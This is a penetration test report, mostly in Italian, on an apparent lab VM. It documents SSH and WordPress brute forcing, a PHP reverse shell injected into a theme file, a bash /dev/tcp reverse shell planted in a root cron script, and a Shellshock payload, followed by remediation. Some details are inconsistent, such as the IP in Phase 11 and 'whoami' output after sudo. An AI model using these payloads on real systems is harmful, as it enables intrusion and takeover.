# Black Box Penetration Test Report

**Target:** 192.168.50.9  
**Test Type:** Black Box Penetration Test  
**Tester:** [Your Name]  
**Date:** January 27, 2026  
**Status:** CONFIDENTIAL

---

## Executive Summary

Durante il black box penetration test condotto sul sistema target 192.168.50.9, sono state identificate **vulnerabilità critiche** che hanno permesso la completa compromissione del sistema attraverso **due attack path distinti**:

### Attack Path 1: SSH Brute Force + Sudo Misconfiguration
1. **Accesso FTP anonimo** con information disclosure (lista utenti)
2. **Credenziali SSH deboli** individuate tramite brute force (anne:princess)
3. **Privilege escalation** tramite configurazione sudo non sicura
4. **Vulnerabilità Shellshock** (CVE-2014-6271) identificata post-compromissione

### Attack Path 2: WordPress Exploitation + Cron Job Hijacking
1. **WordPress installation discovery** tramite robots.txt
2. **WordPress credentials brute force** (john:enigma)
3. **PHP Reverse Shell injection** tramite Theme Editor
4. **Privilege escalation** via cron job world-writable (/usr/local/bin/cleanup)

Entrambi i path hanno portato a **ROOT ACCESS COMPLETO**. Il sistema presenta un **livello di rischio CRITICO** e richiede interventi immediati di remediation.

---

## Metodologia

Il test è stato condotto seguendo una metodologia black box standard:

1. **Reconnaissance & Host Discovery**
2. **Vulnerability Assessment** (scansioni non autenticate)
3. **Service Enumeration**
4. **Exploitation**
5. **Post-Exploitation & Privilege Escalation**
6. **Credentialed Vulnerability Assessment**

---

## Scope del Test

**Target Systems:**
- 192.168.50.9 (Linux Ubuntu 12.04 LTS)

**IP Range Scanned:**
- 192.168.0.0/16

**Excluded Systems:**
- Nessuno

---

## Findings Summary

| Severity | Count | Description |
|----------|-------|-------------|
| **CRITICAL** | 5 | End of Life OS, Bash RCE (Shellshock), WordPress Admin Access, Theme Editor RCE, World-Writable Cron Job |
| **HIGH** | 2 | Weak WordPress Credentials, Anonymous FTP Access |
| **MEDIUM** | 4 | Apache, MySQL, SSH Multiple Issues |
| **LOW** | 1 | ICMP Timestamp Disclosure |
| **INFO** | Multiple | Service detection, port scanners detected |

---

## Detailed Attack Path

### Phase 1: Reconnaissance & Host Discovery

**Tool:** netdiscover / ARP scanning  
**Command:**
```bash
netdiscover -r 192.168.0.0/16
```

**Results:**
- **Target Identified:** 192.168.50.9
- **MAC Address:** 08:00:27:f3:f2:8b
- **Vendor:** PCS Systemtechnik GmbH (VirtualBox)
- **Total Hosts:** 14 hosts discovered in the network

**Analysis:**  
La scansione ARP ha identificato con successo il target nel range di rete specificato.

---

### Phase 2: Initial Vulnerability Assessment (Uncredentialed)

**Tool:** Nessus Professional  
**Scan Type:** Basic Network Scan (Uncredentialed)  
**Duration:** ~8 minutes

**Vulnerabilities Detected:**

#### CRITICAL - Canonical Ubuntu Linux End of Life (12.04.x)
- **CVSS:** 10.0
- **Plugin ID:** N/A
- **Description:** Il sistema operativo Ubuntu 12.04 LTS ha raggiunto l'end of life e non riceve più aggiornamenti di sicurezza
- **Impact:** Vulnerabilità note non patchate, esposizione ad exploit pubblici
- **Remediation:** Upgrade immediato a una versione supportata di Ubuntu (20.04 LTS o 22.04 LTS)

#### MIXED Severity Issues:
- **Apache HTTP Server** (Multiple Issues) - 3 vulnerabilities
- **Oracle MySQL** (Multiple Issues) - 5 vulnerabilities  
- **SSH** (Multiple Issues) - 6 vulnerabilities (Misc category)
- **Canonical Ubuntu Linux** (Multiple Issues) - 58 local security checks

#### LOW:
- **ICMP Timestamp Request Remote Date Disclosure** (CVSS 2.1)
  - Permette di determinare l'ora del sistema target

#### INFO:
- HTTP Service Detection - 3 issues
- SSH Service Detection - 9 issues
- Netstat Portscanner (SSH) - 7 detections
- Service Detection - 3 detections

---

### Phase 3: Network Service Enumeration

**Tool:** Nmap  
**Command:**
```bash
nmap -sV -p- --script vuln 192.168.50.9
```

**Open Ports & Services:**

| Port | Protocol | Service | Version |
|------|----------|---------|---------|
| 21 | TCP | FTP | vsftpd 2.3.5 |
| 22 | TCP | SSH | OpenSSH 5.9p1 Debian 5ubuntu1.10 |
| 80 | TCP | HTTP | Apache httpd 2.2.22 ((Ubuntu)) |

**Key Findings:**
- **FTP Anonymous Login Allowed** (vsftpd 2.3.5)
- **HTTP Server:** Apache/2.2.22 - vulnerable, no robots.txt
- **SSH Server:** OpenSSH 5.9p1 - versione datata

**Nmap Vulnerability Scan Results:**
- Confermate le vulnerabilità rilevate da Nessus
- Identificata configurazione FTP non sicura

---

### Phase 4: Exploitation - FTP Anonymous Access

**Tool:** FTP Client  
**Vulnerability:** Anonymous FTP Login Enabled  
**Severity:** MEDIUM

**Exploitation Steps:**

```bash
ftp 192.168.50.9
Name: anonymous
Password: [enter]
```

**Results:**
```
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||36735|).
150 Here comes the directory listing.
drwxr-xr-x    2 65534   65534       4096 Mar 03  2018 public
226 Directory send OK.
```

**Files Discovered:**
```bash
ftp> cd public
ftp> ls
-rw-r--r--    1 0        0              31 Mar 03  2018 users.txt.bk
ftp> get users.txt.bk
```

**Content of users.txt.bk:**
```
abatchy
john
mai
anne
doomguy
```

**Impact:**  
Information disclosure critico - la lista di utenti validi del sistema è stata esposta tramite FTP anonimo. Questa informazione può essere utilizzata per attacchi di brute force mirati.

**Remediation:**
- Disabilitare l'accesso FTP anonimo
- Rimuovere file sensibili dalle directory FTP pubbliche
- Implementare autenticazione forte per FTP o considerare l'uso di SFTP/SCP

---

### Phase 5: SSH Brute Force Attack

**Tool:** Hydra  
**Target Service:** SSH (port 22)  
**Attack Type:** Dictionary-based brute force

**Initial Attempt (Failed):**
```bash
hydra -L users.txt.bk -P /usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt \
192.168.50.9 ssh
```

**Error Encountered:**
```
[ERROR] target ssh://192.168.50.9:22/ does not support password authentication (method reply 4).
```

**Root Cause:**  
Molte configurazioni SSH limitano il numero di tentativi di autenticazione paralleli. È stato necessario ridurre il numero di task paralleli.

---

### Phase 6: SSH Manual Testing

**Manual verification** degli utenti tramite connessione SSH diretta per verificare la risposta del server:

```bash
ssh abatchy@192.168.50.9  # Permission denied (publickey)
ssh john@192.168.50.9     # Permission denied (publickey)
ssh mai@192.168.50.9      # Permission denied (publickey)
ssh anne@192.168.50.9     # Password prompt received
ssh doomguy@192.168.50.9  # Permission denied (publickey)
```

**Key Finding:**  
Solo l'utente **anne** accetta l'autenticazione tramite password, gli altri utenti richiedono autenticazione a chiave pubblica.

**Note di Sicurezza:**  
Tutti i tentativi di connessione hanno generato warning riguardo l'utilizzo di algoritmi di key exchange non sicuri:
```
WARNING: connection is not using a post-quantum key exchange algorithm.
This session may be vulnerable to "store now, decrypt later" attacks.
```

---

### Phase 7: Successful SSH Brute Force (User: anne)

**Tool:** Hydra (optimized parameters)  
**Command:**
```bash
hydra -l anne -P /usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt \
192.168.50.9 ssh -t 4 -V -C
```

**Parameters:**
- `-l anne`: singolo username
- `-P`: password wordlist
- `-t 4`: ridotto a 4 task paralleli per evitare blocking
- `-V`: verbose mode
- `-C`: continue mode

**Results:**
```
[22][ssh] host: 192.168.50.9   login: anne   password: princess
1 of 1 target successfully completed, 1 valid password found
```

**Credentials Obtained:**
- **Username:** anne
- **Password:** princess

**Severity:** CRITICAL  
**Impact:** Compromissione completa dell'account utente tramite password debole.

**Remediation:**
- Implementare policy di password complesse
- Considerare l'uso di autenticazione a due fattori (2FA)
- Disabilitare l'autenticazione password-based in favore di chiavi SSH
- Implementare fail2ban o meccanismi di rate limiting

---

### Phase 8: Initial Access & System Information Gathering

**Access Method:** SSH  
**Credentials:** anne:princess

```bash
ssh anne@192.168.50.9
```

**System Information:**
```
Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic i686)

* Documentation:  https://help.ubuntu.com/

382 packages can be updated.
275 updates are security updates.

New release "14.04.5 LTS" available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Sun Mar  4 16:14:55 2018 from 192.168.1.68
```

**Key Observations:**
- **OS:** Ubuntu 12.04.4 LTS (End of Life)
- **Kernel:** Linux 3.11.0-15-generic i686
- **Updates Available:** 382 packages (275 security updates)
- Sistema gravemente non aggiornato

**Initial Enumeration:**
```bash
anne@bsides2018:~$ whoami
anne

anne@bsides2018:~$ id
uid=1002(anne) gid=1002(anne) groups=1002(anne)
```

---

### Phase 9: Privilege Escalation to Root

**Method:** Sudo misconfiguration  
**Severity:** CRITICAL

**Discovery:**
```bash
anne@bsides2018:~$ sudo -l
[sudo] password for anne:
Matching Defaults entries for anne on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User anne may run the following commands on this host:
    (ALL : ALL) ALL
```

**Exploitation:**
```bash
anne@bsides2018:~$ sudo /bin/bash
root@bsides2018:~# whoami
anne
root@bsides2018:~# id
uid=0(root) gid=0(root) groups=0(root)
```

**Proof of Privilege Escalation:**
```bash
root@bsides2018:~# whoami
root
```

**Impact:** CRITICAL  
L'utente **anne** ha privilegi sudo completi senza restrizioni, permettendo l'escalation immediata a root.

**Vulnerability Details:**
- **Affected User:** anne
- **Sudo Configuration:** (ALL : ALL) ALL
- **Authentication Required:** Yes (password utente)
- **Impact:** Complete system compromise

**Remediation:**
- Rimuovere i privilegi sudo dall'utente anne o limitarli a comandi specifici
- Implementare il principio del minimo privilegio
- Utilizzare sudoers con restrizioni granulari (esempio: `/usr/bin/apt-get update`)
- Audit regolare delle configurazioni sudo
- Implementare logging centralizzato dei comandi sudo

---

### Phase 10: Post-Exploitation - Credentialed Vulnerability Scan

**Tool:** Nessus Professional  
**Scan Type:** Credentialed Scan  
**Credentials Used:** anne:princess (with sudo privileges)  
**Duration:** ~7 minutes

**Critical Vulnerabilities Discovered:**

#### CRITICAL - Bash Remote Code Execution (Shellshock) - CVE-2014-6271
- **CVSS:** 10.0
- **CVSS Vector:** CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
- **Plugin ID:** Bash Shellshock Detection
- **Family:** Gain a shell remotely

**Description:**  
Il sistema è vulnerabile a Shellshock (CVE-2014-6271), una vulnerabilità critica in GNU Bash che permette l'esecuzione di codice arbitrario da remoto. Questa vulnerabilità è stata scoperta nel 2014 e colpisce versioni di Bash anteriori alla patch.

**Technical Details:**
- Bash interpreta erroneamente variabili d'ambiente che contengono definizioni di funzioni seguite da comandi
- L'exploit permette l'esecuzione di comandi arbitrari attraverso richieste HTTP, CGI scripts, DHCP, etc.
- CVSS Score: 10.0 (Maximum Severity)

**Exploitation Scenario:**
```bash
# Example exploitation via HTTP
curl -A "() { :; }; /bin/cat /etc/passwd" http://192.168.50.9/cgi-bin/vulnerable.sh
```

**Proof of Concept:**
```bash
env x='() { :;}; echo vulnerable' bash -c "echo test"
```
Se il sistema restituisce "vulnerable", il sistema è compromettibile.

**Impact:**  
Un attaccante remoto può eseguire comandi arbitrari con i privilegi del processo Bash vulnerabile, potenzialmente ottenendo accesso completo al sistema senza autenticazione.

**Remediation:**
- **URGENTE:** Aggiornare bash alla versione più recente
```bash
sudo apt-get update
sudo apt-get install --only-upgrade bash
```
- Verificare la versione: `bash --version` (richiesta >= 4.3 con patch)
- Riavviare tutti i servizi che utilizzano bash
- Considerare l'upgrade completo del sistema operativo

---

#### CRITICAL - Canonical Ubuntu Linux End of Life (12.04.x)
- **CVSS:** 10.0
- **Count:** 1 vulnerability
- **Status:** Confermato tramite scan autenticato

**Additional Vulnerabilities Found (Credentialed Scan):**

| Severity | Count | Category |
|----------|-------|----------|
| CRITICAL | 15 | Various critical vulnerabilities |
| HIGH | 22 | High severity issues |
| MEDIUM | 26 | Medium severity issues |
| LOW | 7 | Low severity issues |
| INFO | 73 | Informational findings |

**Total Vulnerabilities:** 143 (vs 48 in uncredentialed scan)

**Key Findings:**
- L'autenticazione ha permesso di identificare **95 vulnerabilità aggiuntive** non visibili senza credenziali
- Il numero di vulnerabilità CRITICAL è aumentato da 2 a 15
- Identificate vulnerabilità nel kernel, nelle librerie di sistema, e nei pacchetti installati

---

## Alternative Attack Path #2: WordPress Exploitation

Oltre al primo path di attacco tramite SSH, è stato identificato un **secondo vettore di attacco completamente indipendente** attraverso un'installazione WordPress non sicura presente sullo stesso host.

### Phase 11: Web Service Enumeration - robots.txt Discovery

**Tool:** Nmap  
**Command:**
```bash
nmap -sV -sC 192.168.50.6
```

**Key Finding - HTTP robots.txt:**
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.5
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-robots.txt: 1 disallowed entry
|_/backup_wordpress
```

**Analysis:**  
Il file robots.txt rivela la presenza di una directory nascosta `/backup_wordpress`, indicando un'installazione WordPress backup o di test non adeguatamente protetta.

**Impact:** MEDIUM  
Information disclosure che rivela la struttura delle directory e potenziali vettori di attacco.

---

### Phase 12: WordPress Installation Discovery

**Access Method:** Browser  
**URL:** http://192.168.50.6/backup_wordpress

**Findings:**

**WordPress Blog Identified:**
- **Title:** "Deprecated WordPress blog"
- **Tagline:** "Just another WordPress site"
- **Post Content:** "[Retired] This blog is no longer being maintained"
- **Author:** john
- **Date:** March 7, 2018
- **Contact:** "For any questions, please contact IT administrator john."

**Key Observations:**
- WordPress installation attiva ma "deprecated"
- Username valido identificato: **john**
- Possibile target per brute force attack
- WordPress versione 4.5 (rilevata successivamente)

**Security Issues:**
- Blog non rimosso dopo il "retirement"
- Username esposto pubblicamente
- Nessuna autenticazione richiesta per la lettura

---

### Phase 13: WordPress Login Page Enumeration

**Tool:** Metasploit Framework  
**Module:** `auxiliary/scanner/http/wordpress_login_enum`

**Configuration:**
```bash
msf > use auxiliary/scanner/http/wordpress_login_enum
msf auxiliary(scanner/http/wordpress_login_enum) > set RHOSTS 192.168.50.9
msf auxiliary(scanner/http/wordpress_login_enum) > set TARGETURI /backup_wordpress
msf auxiliary(scanner/http/wordpress_login_enum) > set PASS_FILE /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
msf auxiliary(scanner/http/wordpress_login_enum) > run
```

**Detection Results:**
```
[*] /backup_wordpress - WordPress Version 4.5 detected
[*] 192.168.50.9:80 - /backup_wordpress - WordPress User Enumeration - Running User Enumeration
[*] 192.168.50.9:80 - /backup_wordpress - WordPress User Validation - Running User Validation
```

**WordPress Details:**
- **Version:** 4.5 (obsoleta, rilasciata nel 2016)
- **Login URL:** http://192.168.50.9/backup_wordpress/wp-login.php
- **Admin Panel:** Accessibile senza restrizioni

---

### Phase 14: WordPress Credentials Brute Force

**Tool:** Metasploit Framework  
**Module:** `auxiliary/scanner/http/wordpress_login_enum`  
**Username:** john (identificato dalla fase precedente)  
**Wordlist:** /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt

**Attack Execution:**
```bash
msf > search wordpress_login

Matching Modules
================
   #  Name                                               Disclosure Date  Rank    Check  Description
   -  ----                                               ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/wordpress_login_enum        .                normal  No     WordPress Brute Force and User Enumeration Utility
```

**Brute Force Results:**
```
[*] 192.168.50.9:80 - [10649/60000] - /backup_wordpress - WordPress Brute Force - Trying username:'john' with password:'enigma'
[+] /backup_wordpress - WordPress Brute Force - SUCCESSFUL login for 'john' : 'enigma'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

**Credentials Obtained:**
- **Username:** john
- **Password:** enigma
- **Access Level:** WordPress Administrator

**Severity:** CRITICAL  
**Impact:** Accesso amministrativo completo al pannello WordPress, permettendo l'esecuzione di codice arbitrario.

**Vulnerability Analysis:**
- Password debole (presente in common wordlist)
- Nessun rate limiting sui tentativi di login
- Nessuna protezione contro brute force (no fail2ban, no CAPTCHA)
- Account amministratore con credenziali banali

---

### Phase 15: WordPress Admin Panel Access

**Access Method:** Web Browser  
**URL:** http://192.168.50.9/backup_wordpress/wp-login.php  
**Credentials:** john:enigma

**Login Success:**
```
Username or Email: john
Password: ••••••
[✓] Remember Me
[Log In]
```

**Admin Dashboard Access Confirmed:**
- Full administrative privileges
- Access to theme editor
- Access to plugin editor
- Ability to upload files
- Complete control over WordPress installation

---

### Phase 16: WordPress Dashboard Enumeration

**WordPress Version Information:**
```
WordPress 4.5 is available! Please update now.
WordPress 4.5 running Twenty Sixteen theme.
```

**Dashboard Statistics:**
- 2 Posts
- 1 Page
- 1 Comment
- Update to 6.9 available

**Available Admin Functions:**
- Dashboard
- Posts
- Media
- Pages
- Comments
- Appearance (Themes, Customize, Widgets, Menus, Header, Background, **Editor**)
- Plugins
- Users
- Tools
- Settings

**Critical Finding:** Theme Editor accessible - permette la modifica diretta di file PHP del tema.

---

### Phase 17: Theme Editor Access for Code Injection

**Navigation:** Appearance → Editor  
**Target File:** Twenty Sixteen: Theme Footer (footer.php)

**Current Code Visible:**
```php
/*
Theme Name: Twenty Sixteen
Theme URI: https://wordpress.org/themes/twentysixteen/
Author: the WordPress team
...
*/
```

**Available Template Files:**
- 404 Template (404.php)
- Archives (archive.php)
- Comments (comments.php)
- Theme Footer (footer.php) ← **TARGET**
- Theme Functions (functions.php)
- Theme Header (header.php)
- Main Index Template (index.php)
- Image Attachment Template (image.php)
- ...and more

**Exploitation Strategy:**
Iniettare una reverse shell PHP nel file footer.php che verrà eseguito ad ogni caricamento di pagina del blog.

---

### Phase 18: PHP Reverse Shell Injection

**Tool:** Theme Editor (WordPress Admin Panel)  
**Target File:** footer.php  
**Payload:** PHP Reverse Shell

**Reverse Shell Code Injected:**
```php
set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.50.5';  // CHANGE THIS
$port = 4444;          // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

**Attack Configuration:**
- **Attacker IP:** 192.168.50.5 (Kali Linux)
- **Listening Port:** 4444
- **Shell Type:** /bin/sh interactive shell

**Code Placement:**
Il codice della reverse shell è stato inserito all'inizio del file footer.php, garantendo l'esecuzione automatica ogni volta che una pagina del sito viene caricata.

**Severity:** CRITICAL  
**Impact:** Remote Code Execution (RCE) come utente www-data sul server web.

---

### Phase 19: Netcat Listener Setup

**Tool:** Netcat  
**Command:**
```bash
nc -lvnp 4444
```

**Listener Status:**
```
listening on [any] 4444 ...
```

**Configuration:**
- `-l`: Listen mode
- `-v`: Verbose output
- `-n`: No DNS resolution
- `-p 4444`: Listen on port 4444

**Waiting for Connection:**
Il listener è in attesa che qualcuno carichi una pagina del WordPress blog, triggering l'esecuzione della reverse shell.

---

### Phase 20: Reverse Shell Connection Established

**Trigger:** Navigazione su qualsiasi pagina WordPress  
**URL Example:** http://192.168.50.9/backup_wordpress/

**Connection Established:**
```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.50.5] from (UNKNOWN) [192.168.50.9] 34905
Linux bsides2018 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
 03:59:31 up 43 min,  0 users,  load average: 0.05, 0.22, 0.51
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

**Initial Access Achieved:**
- **User:** www-data
- **Shell:** /bin/sh (limited)
- **OS:** Linux bsides2018 3.11.0-15-generic
- **Architecture:** i686 (32-bit)
- **Uptime:** 43 minutes

**Limitations:**
- No TTY (job control disabled)
- Limited shell interactivity
- Running as low-privileged web server user

---

### Phase 21: Post-Exploitation Enumeration - Cron Jobs Discovery

**Objective:** Privilege escalation from www-data to root

**System Enumeration:**
```bash
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    /usr/local/bin/cleanup
```

**CRITICAL FINDING:**
```
*  *    * * *   root    /usr/local/bin/cleanup
```

**Analysis:**
- Script eseguito **ogni minuto** come **root**
- Potenziale vettore per privilege escalation se modificabile

---

### Phase 22: Cron Script Permissions Analysis

**Script Examination:**
```bash
$ cat /usr/local/bin/cleanup
#!/bin/sh

rm -rf /var/log/apache2/*    # Clean those damn logs!!

$ ls -la /usr/local/bin/cleanup
-rwxrwxrwx 1 root root 64 Mar  3  2018 /usr/local/bin/cleanup
```

**CRITICAL SECURITY ISSUE:**

**Permissions:** `-rwxrwxrwx` (777)
- **Owner:** root
- **Group:** root
- **World-writable:** YES (!!!)

**Vulnerability Details:**
- File eseguito come root ogni minuto via cron
- Permessi 777 = qualsiasi utente può modificare il file
- Perfect privilege escalation vector

**Impact:** CRITICAL  
Qualsiasi utente sul sistema (incluso www-data) può modificare questo script e ottenere esecuzione di comandi come root.

**Exploitation Plan:**
1. Modificare `/usr/local/bin/cleanup` per eseguire una reverse shell
2. Attendere il prossimo minuto (esecuzione automatica via cron)
3. Ricevere shell con privilegi root

---

### Phase 23: Setting Up Root Shell Listener

**Tool:** Netcat  
**Command:**
```bash
nc -lvnp 443
```

**Listener Configuration:**
```
listening on [any] 443 ...
```

**Port Selection:**
- Port 443 scelto per mimicry HTTPS traffic
- Meno probabile che venga filtrato da firewall
- Port alternativo rispetto al 4444 usato per www-data shell

---

### Phase 24: Malicious Script Injection

**Action:** Modifica del cron script per privilege escalation

**Original Content:**
```bash
#!/bin/sh
rm -rf /var/log/apache2/*    # Clean those damn logs!!
```

**Modified Content:**
```bash
$ echo '#!/bin/bash' > /usr/local/bin/cleanup
$ echo 'sh -i >& /dev/tcp/192.168.50.5/443 0>&1' >> /usr/local/bin/cleanup
```

**Injected Payload:**
```bash
#!/bin/bash
sh -i >& /dev/tcp/192.168.50.5/443 0>&1
```

**Payload Explanation:**
- `sh -i`: Interactive shell
- `>&`: Redirect both stdout and stderr
- `/dev/tcp/192.168.50.5/443`: TCP connection to attacker
- `0>&1`: Redirect stdin to stdout (full interactive shell)

**Execution Timeline:**
Il cron job esegue lo script ogni minuto. Entro 60 secondi, il sistema eseguirà automaticamente la reverse shell come root.

---

### Phase 25: Root Access Achieved

**Connection Received:**
```bash
nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.50.5] from (UNKNOWN) [192.168.50.9] 59985
sh: 0: can't access tty; job control turned off
# whoami
root
#
```

**ROOT SHELL OBTAINED:**
- **User:** root (uid=0)
- **Access Method:** Cron job exploitation
- **Shell Type:** Interactive /bin/sh
- **Full System Compromise:** YES

**Proof of Compromise:**
```bash
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```

**Attack Success:**
Completa compromissione del sistema tramite:
1. WordPress credentials brute force
2. Theme Editor RCE
3. World-writable cron job privilege escalation

**Time to Root:** ~15-20 minuti dall'identificazione di WordPress

---

## Risk Analysis

### Overall Risk Rating: CRITICAL

**Likelihood:** VERY HIGH  
- Sistema esposto con servizi vulnerabili multipli
- Credenziali deboli su servizi critici (SSH + WordPress)
- FTP anonimo abilitato con information disclosure
- Configurazione sudo insicura (Path 1)
- WordPress obsoleto e non protetto (Path 2)
- World-writable cron job eseguito come root (Path 2)
- **Due vettori di attacco indipendenti** entrambi portano a root

**Impact:** CRITICAL  
- Compromissione completa del sistema (root access via 2 path distinti)
- Possibile lateral movement nella rete
- Potenziale data breach e perdita di confidenzialità
- Sistema vulnerabile a worm e malware (Shellshock)
- Persistenza ottenibile tramite backdoor, cron jobs, SSH keys
- Possibile uso come pivot point per attacchi ad altri sistemi

### Attack Chain Summary - Path 1 (SSH)

```
[1] FTP Anonymous Access
    ↓
[2] User List Discovery (users.txt.bk)
    ↓
[3] SSH Brute Force Attack
    ↓
[4] Weak Password Found (anne:princess)
    ↓
[5] SSH Access Obtained
    ↓
[6] Sudo Privilege Escalation
    ↓
[7] ROOT ACCESS ACHIEVED
    ↓
[8] Shellshock Vulnerability Confirmed (Post-Exploitation)
```

**Time to Compromise:** < 2 ore

### Attack Chain Summary - Path 2 (WordPress)

```
[11] robots.txt Discovery
     ↓
[12] WordPress Installation Found (/backup_wordpress)
     ↓
[13] WordPress Version 4.5 Enumeration
     ↓
[14] WordPress Credentials Brute Force
     ↓
[15] Admin Access (john:enigma)
     ↓
[16] Theme Editor Access
     ↓
[17] PHP Code Injection (footer.php)
     ↓
[18] Reverse Shell as www-data
     ↓
[19] Cron Job Discovery (/usr/local/bin/cleanup)
     ↓
[20] World-Writable Script Exploitation (777 permissions)
     ↓
[21] ROOT ACCESS ACHIEVED
```

**Time to Compromise:** 15-20 minuti

### Combined Risk Assessment

**Multiple Independent Attack Vectors:**
Il sistema presenta **almeno due path completamente indipendenti** per ottenere root access, aumentando drasticamente la probabilità di compromissione:

1. Se un amministratore corregge solo le vulnerabilità SSH, l'attaccante può usare WordPress
2. Se viene protetto WordPress, l'attaccante può usare SSH
3. Entrambi i path sono facilmente exploitable con tool pubblici
4. Entrambi i path richiedono solo credenziali deboli come entry point

**Defense Evasion:**
- Diversi servizi compromessi (SSH, HTTP, Cron)
- Molte possibilità di persistenza
- Lateral movement facilitato da credenziali multiple

**Business Impact:**
- **Confidentiality:** CRITICAL - Accesso completo a tutti i dati del sistema
- **Integrity:** CRITICAL - Possibilità di modificare qualsiasi file/database
- **Availability:** CRITICAL - Possibilità di causare DoS o distruggere il sistema

---

## Recommendations

### Immediate Actions (Priority 1 - 24-48 hours)

1. **Disabilitare l'accesso FTP anonimo**
   ```bash
   # Edit /etc/vsftpd.conf
   anonymous_enable=NO
   sudo service vsftpd restart
   ```

2. **Rimuovere o proteggere l'installazione WordPress backup**
   ```bash
   # Option 1: Remove completely
   sudo rm -rf /var/www/html/backup_wordpress
   
   # Option 2: Protect with .htaccess
   sudo nano /var/www/html/backup_wordpress/.htaccess
   # Add:
   # Deny from all
   # Allow from 192.168.x.x  # Your admin IP only
   ```

3. **Cambiare IMMEDIATAMENTE le password**
   ```bash
   # SSH user
   sudo passwd anne
   # Use strong password (min 16 chars, mixed case, numbers, symbols)
   
   # WordPress admin (via wp-cli or admin panel)
   wp user update john --user_pass='NEW_STRONG_PASSWORD'
   ```

4. **Correggere i permessi del cron script**
   ```bash
   sudo chmod 700 /usr/local/bin/cleanup
   sudo chown root:root /usr/local/bin/cleanup
   # Verify: ls -la /usr/local/bin/cleanup
   # Should show: -rwx------ 1 root root
   ```

5. **Rimuovere i privilegi sudo non necessari**
   ```bash
   sudo visudo
   # Remove or restrict anne's sudo privileges
   # Change from: anne ALL=(ALL:ALL) ALL
   # To: anne ALL=(ALL:ALL) /usr/bin/specific-command
   ```

6. **Applicare patch per Shellshock**
   ```bash
   sudo apt-get update
   sudo apt-get install --only-upgrade bash
   # Verify: bash --version (should be >= 4.3 with patches)
   ```

7. **Disabilitare WordPress Theme/Plugin Editor**
   ```php
   # Add to wp-config.php:
   define('DISALLOW_FILE_EDIT', true);
   define('DISALLOW_FILE_MODS', true);
   ```

8. **Implementare fail2ban per SSH e WordPress**
   ```bash
   sudo apt-get install fail2ban
   sudo systemctl enable fail2ban
   sudo systemctl start fail2ban
   
   # Configure WordPress protection
   sudo nano /etc/fail2ban/jail.local
   # Add WordPress jail configuration
   ```

### Short Term Actions (Priority 2 - 1-2 weeks)

9. **Aggiornare WordPress all'ultima versione**
   ```bash
   cd /var/www/html/backup_wordpress
   sudo -u www-data wp core update
   sudo -u www-data wp plugin update --all
   sudo -u www-data wp theme update --all
   ```

10. **Implementare WordPress security hardening**
    ```bash
    # Install security plugin
    sudo -u www-data wp plugin install wordfence --activate
    
    # Limit login attempts
    sudo -u www-data wp plugin install limit-login-attempts-reloaded --activate
    
    # Change WordPress security keys
    wp config shuffle-salts
    
    # Hide WordPress version
    # Add to functions.php: remove_action('wp_head', 'wp_generator');
    ```

11. **Disabilitare autenticazione password SSH**
    ```bash
    # Edit /etc/ssh/sshd_config
    PasswordAuthentication no
    PubkeyAuthentication yes
    PermitRootLogin no
    sudo service ssh restart
    ```

12. **Implementare autenticazione basata su chiavi SSH**
    - Generare chiavi SSH per tutti gli utenti autorizzati
    - Distribuire chiavi pubbliche
    - Revocare l'autenticazione password-based

13. **Aggiornare tutti i pacchetti di sistema**
    ```bash
    sudo apt-get update
    sudo apt-get upgrade
    sudo apt-get dist-upgrade
    ```

14. **Implementare Web Application Firewall (WAF)**
    - ModSecurity per Apache
    - Regole OWASP Core Rule Set
    - Rate limiting per login endpoints

15. **Audit regolare dei file permissions**
    ```bash
    # Find world-writable files
    find / -type f -perm -002 -ls 2>/dev/null
    
    # Find SUID/SGID files
    find / -type f \( -perm -4000 -o -perm -2000 \) -ls 2>/dev/null
    
    # Correct WordPress permissions
    find /var/www/html/backup_wordpress -type d -exec chmod 755 {} \;
    find /var/www/html/backup_wordpress -type f -exec chmod 644 {} \;
    ```

16. **Configurare logging centralizzato**
    - Implementare syslog centralizzato
    - Monitorare tentativi di login SSH e WordPress
    - Alerting su attività sospette
    - Log retention policy

17. **Network Segmentation**
    - Isolare il server in una DMZ
